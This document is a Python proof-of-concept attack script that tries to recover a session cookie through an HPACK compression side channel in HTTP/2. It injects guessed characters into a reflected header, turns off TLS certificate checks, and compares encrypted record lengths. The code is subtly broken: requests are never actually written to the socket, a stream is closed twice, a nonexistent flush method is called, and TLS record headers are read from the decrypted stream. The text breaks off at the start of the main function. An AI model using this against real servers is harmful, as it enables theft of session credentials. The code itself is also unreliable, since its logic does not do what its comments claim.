"""
Proof-of-Concept: HPACK Compression Side-Channel (CRIME/BREACH-like)

This script demonstrates how an attacker can recover secret data (e.g., a session cookie)
by exploiting the shared HPACK compression context in HTTP/2. By injecting known data
into headers and observing the resulting TLS record lengths, the attacker can infer
whether their guess matches the secret, byte-by-byte.

Prerequisites:
- A vulnerable HTTP/2 server that reflects attacker-controlled headers.
- The server must include a secret (e.g., session cookie) in the response headers.
- The attacker must be able to observe the length of encrypted TLS records.

Usage:
python poc_hpack_compression_side_channel.py <target_url> <secret_prefix_guess>
"""

import sys
import socket
import ssl
import struct
import h2.connection
import h2.events
import h2.settings
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# --- Configuration ---
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "https://vulnerable-server.example.com"
SECRET_PREFIX_GUESS = sys.argv[2] if len(sys.argv) > 2 else "sessionid="
SECRET_LENGTH = 32  # Assume the secret is 32 bytes long
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"  # Character set for brute-forcing

# --- Helper Functions ---

def create_tls_context():
    """Create a TLS context that allows us to inspect record lengths."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def send_http2_request(conn, stream_id, headers, secret_guess):
    """
    Send an HTTP/2 request with attacker-controlled headers.
    The server is expected to reflect these headers and include a secret in the response.
    """
    # Craft headers with attacker-controlled data
    request_headers = [
        (":method", "GET"),
        (":path", "/"),
        (":scheme", "https"),
        (":authority", "vulnerable-server.example.com"),
        ("x-attacker-controlled", secret_guess),  # Attacker injects guess here
    ]
    
    # Send the request
    conn.send_headers(stream_id, request_headers, end_stream=True)
    conn.send_data(stream_id, b"", end_stream=True)
    
    # Flush the connection
    conn.flush()

def capture_tls_record_length(sock):
    """
    Capture the length of the next TLS record.
    This simulates the attacker observing the encrypted traffic length.
    """
    # Read TLS record header (5 bytes: 1 for content type, 2 for version, 2 for length)
    header = sock.recv(5)
    if len(header) < 5:
        return None
    
    # Extract record length
    record_length = struct.unpack(">H", header[3:5])[0]
    
    # Discard the rest of the record (we only care about the length)
    sock.recv(record_length)
    
    return record_length

def recover_secret_byte(conn, sock, current_guess):
    """
    Recover one byte of the secret by brute-forcing the character set.
    The attacker sends requests with different guesses and observes the TLS record length.
    A shorter record length indicates a correct guess due to HPACK compression.
    """
    best_guess = None
    min_record_length = float('inf')
    
    for char in CHARSET:
        guess = current_guess + char
        
        # Send request with the current guess
        send_http2_request(conn, 1, [], guess)
        
        # Capture the TLS record length of the response
        record_length = capture_tls_record_length(sock)
        
        if record_length is not None and record_length < min_record_length:
            min_record_length = record_length
            best_guess = guess
    
    return best_guess

# --- Main Execution ---

def main():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Starting HPACK compression side-channel attack...")
    
